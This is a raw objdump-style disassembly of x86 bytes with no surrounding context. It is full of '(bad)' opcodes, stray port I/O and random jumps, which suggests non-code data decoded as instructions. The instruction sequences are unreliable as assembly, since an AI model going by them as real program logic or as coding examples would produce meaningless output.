  41a978:	and    al,0x52
  41a97a:	adc    al,0x4f
  41a97c:	jl     0x41a909
  41a97e:	not    BYTE PTR [edx]
  41a980:	inc    edi
  41a981:	mov    esp,0x541323c4
  41a986:	sti    
  41a987:	inc    eax
  41a988:	push   edx
  41a989:	add    al,BYTE PTR [esi]
  41a98b:	pop    ds
  41a98c:	icebp  
  41a98d:	out    0xcf,eax
  41a98f:	push   ds
  41a990:	add    DWORD PTR [edi-0xba7fcea],0xffffffd9
  41a997:	fbld   TBYTE PTR [edi]
  41a999:	mov    eax,ebp
  41a99b:	mov    esi,0xc0ab4856
  41a9a0:	mov    ebx,0x6ee80f4d
  41a9a5:	sub    ah,BYTE PTR [edi-0x5ccf6ab8]
  41a9ab:	adc    BYTE PTR [esi],dl
  41a9ad:	fsubr  st,st(6)
  41a9af:	xlat   BYTE PTR ds:[ebx]
  41a9b0:	in     al,0x2c
  41a9b2:	in     al,0x27
  41a9b4:	adc    al,0x8f
  41a9b6:	ins    DWORD PTR es:[edi],dx
  41a9b7:	push   edx
  41a9b8:	adc    BYTE PTR [ebp-0x6ffef54c],bh
  41a9be:	rcl    BYTE PTR [ecx-0x696d75a],cl
  41a9c4:	(bad)  
  41a9c5:	mov    edi,0x65ff6393
  41a9ca:	popf   
  41a9cb:	sub    BYTE PTR [ecx+eiz*8],cl
  41a9ce:	lock mov edi,0xe0c89065
  41a9d4:	in     eax,dx
  41a9d5:	mov    DWORD PTR [esi+0x49],0xeb94e6b6
  41a9dc:	scas   al,BYTE PTR es:[edi]
  41a9dd:	jge    0x41aa0f
  41a9df:	push   ds
  41a9e0:	fwait
  41a9e1:	dec    edx
  41a9e2:	int    0x47
  41a9e4:	xchg   esp,eax
  41a9e5:	les    ebx,FWORD PTR ds:0x89b61c4d
  41a9eb:	in     al,dx
  41a9ec:	test   DWORD PTR [edi+0x69],esi
  41a9ef:	pop    edi
  41a9f0:	lea    edi,[ebp+eax*1+0x70]
  41a9f4:	popf   
  41a9f5:	add    ebx,DWORD PTR [edx+0x2d]
  41a9f8:	ss inc edi
  41a9fa:	inc    esp
  41a9fb:	mov    edx,ecx
  41a9fd:	hlt    
  41a9fe:	(bad)  
  41a9ff:	sbb    esp,DWORD PTR [ecx+0x38]
  41aa02:	nop
  41aa03:	shl    BYTE PTR [ecx-0x330efdce],1
  41aa09:	pop    ecx
  41aa0a:	repz aad 0x2a
  41aa0d:	sbb    bh,ch
  41aa0f:	nop    DWORD PTR ds:0xc40fa2c6
  41aa16:	(bad)  
  41aa17:	inc    ah
  41aa19:	sub    BYTE PTR ds:0x91e4cfdd,ch
  41aa1f:	dec    ebp
  41aa20:	pop    edx
  41aa21:	mov    ecx,0xfd4749e4
  41aa26:	jno    0x41aa1b
  41aa28:	push   esp
  41aa29:	loope  0x41a9b6
  41aa2b:	mov    edx,0xe68dc9d8
  41aa30:	dec    ebp
  41aa31:	mov    ebx,0x59fe74
	...
  41aa96:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x7992e277,al
  41aaa4:	sub    DWORD PTR [ecx],edi
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    ch,al
  41aaaf:	enter  0x8574,0x4e
  41aab3:	(bad)  
  41aab4:	popf   
  41aab5:	push   0x55
  41aab7:	add    BYTE PTR [edx+0x46],0xd3
  41aabb:	sbb    eax,0xc7e72949
  41aac0:	out    0xa,eax
  41aac2:	mov    ebx,0x56f665a9
  41aac7:	inc    esi
  41aac8:	cmp    esi,edi
  41aaca:	adc    ebx,DWORD PTR [ebp+0x77c2b25a]
  41aad0:	cmp    eax,0xf4f67483
  41aad5:	stos   BYTE PTR es:[edi],al
  41aad6:	push   es
  41aad7:	hlt    
  41aad8:	inc    edi
  41aad9:	jecxz  0x41ab03
  41aadb:	xor    BYTE PTR [esi],0x65
  41aade:	push   edx
  41aadf:	cmp    DWORD PTR [ebp-0x2],ecx
  41aae2:	pop    esp
  41aae3:	in     al,dx
  41aae4:	icebp  
  41aae5:	rol    eax,1
  41aae7:	ins    DWORD PTR es:[edi],dx
  41aae8:	sub    eax,0x6ed32b0f
  41aaed:	inc    ebp
  41aaee:	jnp    0x41ab07
  41aaf0:	pop    edx
  41aaf1:	in     al,dx
  41aaf2:	in     eax,dx
  41aaf3:	je     0x41ab72
  41aaf5:	(bad)  
  41aaf6:	idiv   BYTE PTR ds:0xa82d082e
  41aafc:	fdiv   QWORD PTR [ebx-0x28]
  41aaff:	push   es
  41ab00:	jbe    0x41aa92
  41ab02:	fwait
  41ab03:	mov    ecx,0x1a164e9f
  41ab08:	or     al,BYTE PTR [ebp-0x41de402f]
  41ab0e:	sbb    al,0x3
  41ab10:	popf   
  41ab11:	mov    dl,0x39
  41ab13:	pushf  
  41ab14:	jecxz  0x41ab76
  41ab16:	ror    DWORD PTR [ebx+0x3076b01c],0x34
  41ab1d:	xchg   dx,ax
  41ab1f:	int    0xa5
  41ab21:	out    dx,eax
  41ab22:	dec    ebx
  41ab23:	inc    edi
  41ab24:	mov    WORD PTR [edx],gs
  41ab26:	cmp    al,0xd2
  41ab28:	mov    bl,0x34
  41ab2a:	add    edx,edx
  41ab2c:	inc    eax
  41ab2d:	dec    ecx
  41ab2e:	imul   edi,DWORD PTR [ebx+ebx*4+0x31d6c438],0x605b5ca6
  41ab39:	clc    
  41ab3a:	(bad)  
  41ab3b:	push   0x2f
  41ab3d:	cwde   
  41ab3e:	aam    0x69
  41ab40:	xor    al,0xc6
  41ab42:	cwde   
  41ab43:	ror    BYTE PTR [eax+eiz*4],0x65
  41ab47:	sbb    DWORD PTR ds:0xcdf86a16,esp
  41ab4d:	les    ecx,FWORD PTR [esi+0x221f99ac]
  41ab53:	lods   al,BYTE PTR ds:[esi]
  41ab54:	xor    al,0xdf
  41ab56:	(bad)  [esi+0x49992942]
  41ab5c:	clc    
  41ab5d:	pop    es
  41ab5e:	pop    ss
  41ab5f:	fstp   QWORD PTR [ecx+esi*4]
  41ab62:	mov    bh,0x6f
  41ab64:	je     0x41abbb
  41ab66:	pop    edx
  41ab67:	mov    es,eax
  41ab69:	jg     0x41ab58
  41ab6b:	in     eax,0x17
  41ab6d:	fstp   DWORD PTR [eax-0x9]
  41ab70:	imul   edi,DWORD PTR [edx-0x6ac48858],0xffffffeb
  41ab77:	mov    ecx,0x9b76cedd
  41ab7c:	ror    BYTE PTR [esi],1
  41ab7e:	or     eax,0x730fc496
  41ab83:	(bad)  
  41ab84:	sub    bl,BYTE PTR [ebx+0x7e195880]
  41ab8a:	mov    ecx,0xa31e65d4
  41ab8f:	xchg   esp,eax
  41ab90:	popa   
  41ab91:	xor    eax,0x497f9fff
  41ab96:	adc    BYTE PTR [ebx+eiz*1-0x5ec652a2],0x6c
  41ab9e:	pushf  
  41ab9f:	imul   edx,DWORD PTR [edx+0x2664dfcd],0xffffffbc
  41aba6:	push   0x67b526c6
  41abab:	mov    esi,edi
  41abad:	fdiv   st(0),st
  41abaf:	dec    esi
  41abb0:	push   0x68
  41abb2:	xchg   esi,eax
  41abb3:	dec    BYTE PTR [ecx+0x0]
	...
  41ac16:	push   0x49
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0x7772cc53
  41ac24:	cmp    eax,0x119ec8b
  41ac29:	add    BYTE PTR [edi],al
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    bl,dh
  41ac2f:	pop    esi
  41ac30:	mov    al,ds:0x3ce38ce0
  41ac35:	mov    dl,0xe2
  41ac37:	sbb    eax,0xcb2c4543
  41ac3c:	push   ebp
  41ac3d:	mov    ss,WORD PTR [eax-0x6de79396]
  41ac43:	out    0x55,eax
  41ac45:	mov    ah,BYTE PTR [eax-0x5c]
  41ac48:	push   ecx
  41ac49:	dec    eax
  41ac4a:	arpl   WORD PTR [ebx-0x3d],bp
  41ac4d:	sbb    ah,0xf2
  41ac50:	xor    ebx,DWORD PTR [esi]
  41ac52:	cmp    al,0x77
  41ac54:	rol    BYTE PTR [ecx],1
  41ac56:	jecxz  0x41acd3
  41ac58:	in     eax,dx
  41ac59:	shl    BYTE PTR [ebp+0x1674450e],1
  41ac5f:	mov    al,0x48
  41ac61:	out    dx,al
  41ac62:	retf   
  41ac63:	mov    bh,0x36
  41ac65:	add    DWORD PTR [edx-0x69343875],0x0
  41ac6c:	nop
  41ac6d:	lock bound eax,QWORD PTR fs:[esi]
  41ac71:	fs ss jo 0x41acaf
  41ac75:	sbb    edi,DWORD PTR [ebx]
  41ac77:	cli    
  41ac78:	cdq    
  41ac79:	out    0x62,eax
  41ac7b:	test   al,0xf0
  41ac7d:	cdq    
  41ac7e:	mov    ch,0xa4
  41ac80:	inc    ecx
  41ac81:	ror    BYTE PTR [ebx],cl
  41ac83:	push   ecx
  41ac84:	idiv   DWORD PTR [ebx]
  41ac86:	lea    edi,[ecx]
  41ac88:	push   es
  41ac89:	mov    ds:0x2e11d178,al
  41ac8e:	xchg   esp,eax
  41ac8f:	dec    eax
  41ac90:	jne    0x41ac23
  41ac92:	dec    esp
  41ac93:	cmp    dl,BYTE PTR [eax]
  41ac95:	(bad)  
  41ac96:	xor    dh,al
  41ac98:	and    esp,edx
  41ac9a:	mov    edx,ss
  41ac9c:	sub    eax,DWORD PTR [edi+eiz*1+0x127caa4a]
  41aca3:	fnstsw WORD PTR [edx+0x7c]
  41aca6:	cld    
  41aca7:	push   cs
  41aca8:	outs   dx,DWORD PTR ds:[esi]
  41aca9:	loopne 0x41ac3d
  41acab:	int    0x54
  41acad:	xor    eax,0xc2d8c21
  41acb2:	xchg   ecx,eax
  41acb3:	iret   
  41acb4:	cmp    BYTE PTR [ebp+0x14ffe31c],ah
  41acba:	data16 mov ah,BYTE PTR [ecx-0x6b]
  41acbe:	jbe    0x41acf8
  41acc0:	xchg   esi,eax
  41acc1:	sbb    eax,0x12540877
  41acc6:	sar    ah,0x2c
  41acc9:	pushf  
  41acca:	cld    
  41accb:	xchg   edx,eax
  41accc:	jbe    0x41ad48
  41acce:	xor    DWORD PTR [edx],esi
  41acd0:	int3   
  41acd1:	jnp    0x41aca3
  41acd3:	mov    ch,0xc
  41acd5:	fild   QWORD PTR [eax-0x6c]
  41acd8:	scas   eax,DWORD PTR es:[edi]
  41acd9:	test   eax,0x87f1f82b
  41acde:	adc    DWORD PTR [ebx-0x37],esp
  41ace1:	sub    DWORD PTR [ebx-0x21bd6ef7],eax
  41ace7:	rcl    bl,cl
  41ace9:	jae    0x41ace7
  41aceb:	shr    DWORD PTR fs:[ebx],0x1b
  41acef:	(bad)  [ecx-0x4f0bd00f]
  41acf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acf6:	iret   
  41acf7:	inc    ebx
  41acf8:	mov    eax,ds:0x76e94859
  41acfd:	jg     0x41ac87
  41acff:	clc    
  41ad00:	mov    ecx,esi
  41ad02:	dec    esi
  41ad03:	pop    edi
  41ad04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad05:	dec    BYTE PTR ds:0x3143ba26
  41ad0b:	repz int3 
  41ad0d:	in     eax,0xbd
  41ad0f:	dec    ecx
  41ad10:	jl     0x41ad6f
  41ad12:	retf   0x2ec8
  41ad15:	add    edi,DWORD PTR [eax]
  41ad17:	dec    edx
  41ad18:	mov    dh,0x3d
  41ad1a:	xchg   ebx,eax
  41ad1b:	xchg   edx,eax
  41ad1c:	(bad)  
  41ad1f:	pop    esp
  41ad20:	pop    esi
  41ad21:	push   edi
  41ad22:	sbb    BYTE PTR [ecx],0xdf
  41ad25:	mov    ds:0xb54b41ef,eax
  41ad2a:	dec    ebp
  41ad2b:	sbb    al,0xad
  41ad2d:	sbb    edi,ecx
  41ad2f:	dec    edx
  41ad30:	mov    ss,WORD PTR [ebx+0x68]
  41ad33:	xchg   ecx,eax
  41ad34:	jle    0x41ad36
	...
  41ad96:	push   ebp
  41ad97:	clc    
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    ebp,ebx
  41ada3:	fs pop esp
  41ada5:	or     al,0xf3
  41ada7:	sbb    al,BYTE PTR [ecx]
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [edx+0x65],dh
  41adb0:	test   al,0x9b
  41adb2:	sbb    edx,DWORD PTR [edi]
  41adb4:	jb     0x41ad4e
  41adb6:	mov    ebx,0x19048811
  41adbb:	and    dh,dh
  41adbd:	test   al,0x73
  41adbf:	add    DWORD PTR [ebp+0x3a5394fc],ebx
  41adc5:	mov    al,0xd9
  41adc7:	ret    0xfac1
  41adca:	es jae 0x41ade8
  41adcd:	lahf   
  41adce:	icebp  
  41adcf:	scas   al,BYTE PTR es:[edi]
  41add0:	sbb    eax,0xf8f87009
  41add5:	enter  0x8e2a,0x35
  41add9:	mov    ah,0xf5
  41addb:	dec    ecx
  41addc:	repnz dec esp
  41adde:	aaa    
  41addf:	mov    ch,al
  41ade1:	sahf   
  41ade2:	pop    eax
  41ade3:	adc    dl,cl
  41ade5:	scas   al,BYTE PTR es:[edi]
  41ade6:	add    eax,esi
  41ade8:	cld    
  41ade9:	ins    BYTE PTR es:[edi],dx
  41adea:	jl     0x41adc3
  41adec:	int3   
  41aded:	pop    ss
  41adee:	and    al,0x74
  41adf0:	mov    eax,0x876101cb
  41adf5:	outs   dx,DWORD PTR ds:[esi]
  41adf6:	loop   0x41ad95
  41adf8:	out    dx,eax
  41adf9:	mov    cl,cl
  41adfb:	stos   DWORD PTR es:[edi],eax
  41adfc:	xchg   DWORD PTR [esi+0x32],esp
  41adff:	imul   edx,DWORD PTR [ecx],0x1d
  41ae02:	mov    eax,0x7d5a2e3d
  41ae07:	jo     0x41ae24
  41ae09:	iret   
  41ae0a:	mul    cl
  41ae0c:	ret    
  41ae0d:	stos   DWORD PTR es:[edi],eax
  41ae0e:	push   eax
  41ae0f:	and    al,0x6d
  41ae11:	fist   WORD PTR [ebx]
  41ae13:	pusha  
  41ae14:	clc    
  41ae15:	(bad)  
  41ae16:	js     0x41ae52
  41ae18:	or     eax,0x5e8be64c
  41ae1d:	sub    bh,BYTE PTR ds:0xe38301cc
  41ae23:	into   
  41ae24:	ins    BYTE PTR es:[edi],dx
  41ae25:	jp     0x41ae68
  41ae27:	scas   eax,DWORD PTR es:[edi]
  41ae28:	mov    BYTE PTR [ebx+0x42b36cb8],al
  41ae2e:	bound  esp,QWORD PTR [esi+0x7d]
  41ae31:	sub    esp,ecx
  41ae33:	add    bl,BYTE PTR [esi]
  41ae35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae36:	js     0x41ae99
  41ae38:	not    DWORD PTR [ebx-0x4990e1fd]
  41ae3e:	cwde   
  41ae3f:	pop    ebp
  41ae40:	popf   
  41ae41:	or     bl,cl
  41ae43:	xor    eax,0xe57522e1
  41ae48:	fst    QWORD PTR [edi]
  41ae4a:	lahf   
  41ae4b:	inc    edx
  41ae4c:	sahf   
  41ae4d:	dec    bp
  41ae4f:	or     BYTE PTR [ecx-0x78],bh
  41ae52:	iret   
  41ae53:	test   bl,bl
  41ae55:	mov    dl,0xe7
  41ae57:	xchg   DWORD PTR [esi-0x1630d88b],esi
  41ae5d:	stos   BYTE PTR es:[edi],al
  41ae5e:	mov    al,0x27
  41ae60:	fisubr WORD PTR [edi]
  41ae62:	mov    esp,0x5bb12db1
  41ae67:	mov    bl,BYTE PTR [eax+0x3dc0dae]
  41ae6d:	jmp    0x41ae13
  41ae6f:	xchg   ebx,eax
  41ae70:	aaa    
  41ae71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae72:	and    eax,0x83382ec0
  41ae77:	xchg   ch,bl
  41ae79:	and    ebx,esi
  41ae7b:	jmp    0x1c99099c
  41ae80:	pop    ebp
  41ae81:	sbb    esp,DWORD PTR [ecx+edi*1-0x15]
  41ae85:	cmp    DWORD PTR [edx+eiz*8-0x55],eax
  41ae89:	mov    ebx,0x7c75e090
  41ae8e:	mov    ecx,DWORD PTR [ebp+0x5d7e3e62]
  41ae94:	dec    ecx
  41ae95:	add    dl,dh
  41ae97:	adc    eax,0xb079e62d
  41ae9c:	popa   
  41ae9d:	xchg   edi,eax
  41ae9e:	sub    DWORD PTR [eax-0x4f18beb4],edx
  41aea4:	mov    BYTE PTR [esi],0xa2
  41aea7:	pusha  
  41aea8:	and    al,0xa1
  41aeaa:	xor    bl,cl
  41aeac:	or     al,0x5e
  41aeae:	imul   edi,DWORD PTR [ebp+0x326f52ba],0xfffffff6
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af73
  41af23:	(bad)  
  41af24:	pop    ecx
  41af25:	out    0xfa,eax
  41af27:	sbb    eax,DWORD PTR [ecx]
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [eax+0x51],bh
  41af30:	sbb    ebx,ebp
  41af32:	adc    esi,esi
  41af34:	cmp    BYTE PTR [ecx+0x5bd40b29],bh
  41af3a:	add    eax,DWORD PTR [edx-0x3e]
  41af3d:	(bad)  
  41af3e:	fstp   QWORD PTR [edx-0x3c50f982]
  41af44:	mov    dh,0x35
  41af46:	push   es
  41af47:	mov    ah,0xc7
  41af49:	dec    eax
  41af4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4b:	or     eax,0x7385637
  41af50:	or     DWORD PTR [edx],0xef4527a
  41af56:	sar    ecx,cl
  41af58:	push   cs
  41af59:	fidiv  WORD PTR [ebx]
  41af5b:	jnp    0x41afc6
  41af5d:	lahf   
  41af5e:	inc    ebx
  41af5f:	imul   esi,eax,0xe8dac65c
  41af65:	iret   
  41af66:	dec    ebx
  41af67:	xchg   ecx,eax
  41af68:	inc    eax
  41af69:	lea    ecx,[esi-0x3c]
  41af6c:	stc    
  41af6d:	xlat   BYTE PTR ds:[ebx]
  41af6e:	sar    BYTE PTR [ecx],1
  41af70:	jp     0x41af22
  41af72:	jle    0x41af45
  41af74:	mov    ah,0x4a
  41af76:	jge    0x41aff0
  41af78:	lock lds eax,FWORD PTR [ebx+0x7d61942]
  41af7f:	or     DWORD PTR [edi],ebp
  41af81:	mov    ebp,0x7ee7624b
  41af86:	jmp    0xb638251d
  41af8b:	popa   
  41af8c:	(bad)
  41af90:	push   ebx
  41af91:	or     eax,0x6964bf1d
  41af96:	mov    bl,0x58
  41af98:	mov    cl,0x4e
  41af9a:	ret    0xfc75
  41af9d:	push   eax
  41af9e:	(bad)  
  41af9f:	nop
  41afa0:	nop
  41afa1:	sub    al,0x21
  41afa3:	xor    bl,BYTE PTR [edx]
  41afa5:	pop    ebp
  41afa6:	loop   0x41af5e
  41afa8:	inc    bh
  41afaa:	cmp    eax,0xd3e710f0
  41afaf:	cmp    DWORD PTR [esi-0x47bcce5f],0x2bef2f48
  41afb9:	pop    ebx
  41afba:	adc    al,0x68
  41afbc:	daa    
  41afbd:	(bad)  
  41afbe:	out    dx,eax
  41afbf:	cs test eax,0x35f22761
  41afc5:	and    ecx,DWORD PTR [edx-0x7d]
  41afc8:	jecxz  0x41afd3
  41afca:	jge    0x41af9e
  41afcc:	lea    edx,[esi+0x3470efff]
  41afd2:	into   
  41afd3:	pop    ebp
  41afd4:	xlat   BYTE PTR ds:[ebx]
  41afd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afd6:	jbe    0x41b03f
  41afd8:	mov    edx,0x6df4c907
  41afdd:	mov    ecx,0xa8804c1f
  41afe2:	mov    al,0x27
  41afe4:	inc    eax
  41afe5:	ins    BYTE PTR es:[edi],dx
  41afe6:	shr    DWORD PTR [ebx+0x7d],1
  41afe9:	mov    bl,0xbe
  41afeb:	pusha  
  41afec:	fdivr  QWORD PTR [ebp+0x69f38d80]
  41aff2:	bound  edx,QWORD PTR [eax-0x6e2ab9a8]
  41aff8:	add    eax,0xff9fc577
  41affd:	popf   
  41affe:	mov    ebx,0x8184e81f
  41b003:	mov    gs,esi
  41b005:	cdq    
  41b006:	push   eax
  41b007:	cld    
  41b008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b009:	inc    eax
  41b00a:	sub    al,0x18
  41b00c:	dec    esi
  41b00d:	and    al,0x4a
  41b00f:	xor    eax,0x49a6892a
  41b014:	adc    ebp,DWORD PTR [ebp-0x49bef259]
  41b01a:	enter  0xe1b4,0x9f
  41b01e:	dec    ebx
  41b01f:	mov    cl,0x99
  41b021:	ja     0x41b080
  41b023:	test   BYTE PTR [edi],bh
  41b025:	mov    dh,0x93
  41b027:	mov    eax,ds:0x55bb5d00
  41b02c:	stos   DWORD PTR es:[edi],eax
  41b02d:	mov    dh,0x66
  41b02f:	jmp    0x41afd1
  41b031:	and    eax,ebx
  41b033:	sbb    BYTE PTR [eax+0x0],0x0
	...
  41b096:	(bad)  
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi-0x3b9eb8cf]
  41b0a5:	mov    ds:0x11d01,al
  41b0aa:	pop    es
  41b0ab:	add    DWORD PTR [eax],eax
  41b0ad:	add    BYTE PTR [edi+0x32],al
  41b0b0:	push   ecx
  41b0b1:	add    al,BYTE PTR [eax]
  41b0b3:	scas   eax,DWORD PTR es:[edi]
  41b0b4:	xchg   edx,eax
  41b0b5:	sub    bh,bh
  41b0b7:	fucom  st(4)
  41b0b9:	push   edi
  41b0ba:	push   ss
  41b0bb:	pop    ebp
  41b0bc:	pushf  
  41b0bd:	ds cdq 
  41b0bf:	mov    ch,0xa8
  41b0c1:	mov    ds:0xa1307803,al
  41b0c6:	pop    eax
  41b0c7:	lea    ecx,[esi]
  41b0c9:	xchg   edx,eax
  41b0ca:	or     bl,BYTE PTR [ebx+0x57]
  41b0cd:	aas    
  41b0ce:	mov    WORD PTR ds:0xe3c4e398,es
  41b0d4:	or     eax,0x168f7dcb
  41b0d9:	adc    BYTE PTR [edx+0x1db66afb],0x59
  41b0e0:	xchg   cl,ch
  41b0e2:	jnp    0x41b14b
  41b0e4:	retf   0xc319
  41b0e7:	adc    DWORD PTR [edx+0x34454d35],ebx
  41b0ed:	xchg   edi,eax
  41b0ee:	jmp    0x3f83e9fe
  41b0f3:	bsr    esi,DWORD PTR [ebx+eax*8-0x4]
  41b0f8:	cdq    
  41b0f9:	mov    edx,0x32b13747
  41b0fe:	cld    
  41b0ff:	retf   0xa744
  41b102:	add    BYTE PTR [ebx-0x45],bh
  41b105:	mov    esp,0xa53a661b
  41b10a:	cmp    bh,bh
  41b10c:	dec    esp
  41b10d:	ror    DWORD PTR [esi-0x3edf8f4d],0xe3
  41b114:	test   DWORD PTR [esi+eiz*1+0x54],eax
  41b118:	scas   eax,DWORD PTR es:[edi]
  41b119:	cli    
  41b11a:	lahf   
  41b11b:	arpl   WORD PTR [ecx+0x484c49de],bx
  41b121:	xchg   esp,eax
  41b122:	sbb    ch,BYTE PTR [esi+ebx*2+0x6f]
  41b126:	cmp    DWORD PTR [eax-0x6c8b36ba],esp
  41b12c:	scas   eax,DWORD PTR es:[edi]
  41b12d:	test   BYTE PTR [ecx+0x2e9da548],bl
  41b133:	xchg   edi,eax
  41b134:	out    0xb4,al
  41b136:	arpl   WORD PTR [ebp+0x2],di
  41b139:	sbb    ebx,DWORD PTR [ecx+0xe]
  41b13c:	sbb    BYTE PTR [edi+ebp*4],0xb4
  41b140:	icebp  
  41b141:	fistp  WORD PTR [ecx-0x64]
  41b144:	retf   0x35d6
  41b147:	pop    ds
  41b148:	cli    
  41b149:	xchg   ebp,eax
  41b14a:	push   cs
  41b14b:	lahf   
  41b14c:	sbb    BYTE PTR [eax+0x2e7a5b2d],bh
  41b152:	call   0xd3b7702c
  41b157:	stos   DWORD PTR es:[edi],eax
  41b158:	js     0x41b139
  41b15a:	fwait
  41b15b:	retf   
  41b15c:	push   0x60b3305b
  41b161:	mov    al,0xf9
  41b163:	scas   eax,DWORD PTR es:[edi]
  41b164:	add    ebx,ebx
  41b166:	push   eax
  41b167:	mov    dl,0x31
  41b169:	push   eax
  41b16a:	sub    ebp,ebx
  41b16c:	ja     0x41b1b1
  41b16e:	loope  0x41b0f0
  41b170:	loopne 0x41b192
  41b172:	div    DWORD PTR [edx]
  41b174:	rcr    BYTE PTR [ecx+0x17],cl
  41b177:	sbb    edx,ebp
  41b179:	sub    ebx,0x7f89c08f
  41b17f:	mov    edx,0xf58e69f8
  41b184:	dec    ebp
  41b185:	mov    ebp,0x244960e1
  41b18a:	arpl   dx,si
  41b18c:	imul   esp,DWORD PTR [ecx],0xe0e2b574
  41b192:	sub    DWORD PTR ds:0x8a0aa71a,0x6cd5aa2
  41b19c:	test   BYTE PTR [edi-0x1],al
  41b19f:	xchg   esp,eax
  41b1a0:	pushf  
  41b1a1:	(bad)  
  41b1a2:	shl    DWORD PTR [edi-0x1f],cl
  41b1a5:	cmp    al,0x22
  41b1a7:	(bad)  
  41b1a8:	and    dh,ch
  41b1aa:	popf   
  41b1ab:	cdq    
  41b1ac:	std    
  41b1ad:	inc    edi
  41b1ae:	dec    ebp
  41b1af:	mov    ebp,0x3268f3a3
  41b1b4:	add    BYTE PTR [bx+si],al
	...
  41b213:	add    BYTE PTR [eax],al
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	jns    0x41b265
  41b224:	xlat   BYTE PTR ds:[ebx]
  41b225:	(bad)  
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [ecx+0x6],ch
  41b230:	lods   al,BYTE PTR gs:[esi]
  41b232:	das    
  41b233:	push   es
  41b234:	repz imul esi,DWORD PTR [edi-0x3a5d74e0],0x7fb77d48
  41b23f:	lahf   
  41b240:	or     al,0x99
  41b242:	pop    edx
  41b243:	aaa    
  41b244:	mov    cl,BYTE PTR [ecx]
  41b246:	xchg   esi,eax
  41b247:	jge    0x41b265
  41b249:	ret    
  41b24a:	in     eax,0x32
  41b24c:	dec    ebx
  41b24d:	mov    esi,0x8d4018d6
  41b252:	push   es
  41b253:	adc    ebp,DWORD PTR [esi]
  41b255:	out    dx,eax
  41b256:	mov    cl,0xd0
  41b258:	cld    
  41b259:	das    
  41b25a:	sub    DWORD PTR [ecx+0x4d14cdd6],ecx
  41b260:	pop    ds
  41b261:	retf   
  41b262:	mov    eax,ds:0x2701d6b1
  41b267:	add    DWORD PTR [edx],edx
  41b269:	repnz into 
  41b26b:	mov    bl,BYTE PTR [edi+0x4c]
  41b26e:	cli    
  41b26f:	int    0xf6
  41b271:	inc    ebp
  41b272:	aam    0xb7
  41b274:	push   eax
  41b275:	dec    ebp
  41b276:	les    esp,FWORD PTR [eax+0x10]
  41b279:	mov    ch,0x47
  41b27b:	leave  
  41b27c:	mov    dl,0xa7
  41b27e:	loop   0x41b2b1
  41b280:	fstp   QWORD PTR [eax+0x2e]
  41b283:	sbb    ecx,DWORD PTR [edx-0x5e]
  41b286:	fcomp  DWORD PTR [ebx+0x41]
  41b289:	sub    edi,esi
  41b28b:	imul   esi,DWORD PTR [eax-0x302de4a5],0xffffffba
  41b292:	mov    ah,0xf6
  41b294:	ror    DWORD PTR [edi+0x6306f88d],1
  41b29a:	pop    esi
  41b29b:	nop
  41b29c:	xchg   esi,eax
  41b29d:	push   ss
  41b29e:	or     eax,0x99e154d
  41b2a3:	cmp    esp,ebx
  41b2a5:	inc    ebx
  41b2a6:	inc    edx
  41b2a7:	pop    esi
  41b2a8:	xor    DWORD PTR [ebx],edi
  41b2aa:	div    DWORD PTR [ebp-0x64]
  41b2ad:	mov    bl,0x4f
  41b2af:	pop    ebp
  41b2b0:	push   ss
  41b2b1:	pop    es
  41b2b2:	jp     0x41b250
  41b2b4:	out    0x21,al
  41b2b6:	fmul   DWORD PTR [ebx+0x7bce2c]
  41b2bc:	rol    BYTE PTR [edi-0x76],cl
  41b2bf:	fistp  DWORD PTR [eax+0x3cbf795b]
  41b2c5:	lock stos DWORD PTR es:[edi],eax
  41b2c7:	xchg   BYTE PTR [ebp-0x78],ah
  41b2ca:	mov    WORD PTR [ebx+edi*4+0x1513e845],?
  41b2d1:	push   cs
  41b2d2:	das    
  41b2d3:	int    0xbb
  41b2d5:	push   ss
  41b2d6:	pushf  
  41b2d7:	mov    ebp,0x1ea3e6a8
  41b2dc:	push   ebp
  41b2de:	cmp    edi,DWORD PTR [eax]
  41b2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e1:	test   BYTE PTR [ebx+0x2f6eb43d],0x88
  41b2e8:	arpl   WORD PTR [bp+si],cx
  41b2eb:	jb     0x41b27d
  41b2ed:	icebp  
  41b2ee:	mov    dh,bl
  41b2f0:	pusha  
  41b2f1:	jle    0x41b2fd
  41b2f3:	test   dh,al
  41b2f5:	(bad)  
  41b2f6:	sbb    al,0x8a
  41b2f8:	jp     0x41b2d6
  41b2fa:	xor    al,0xd6
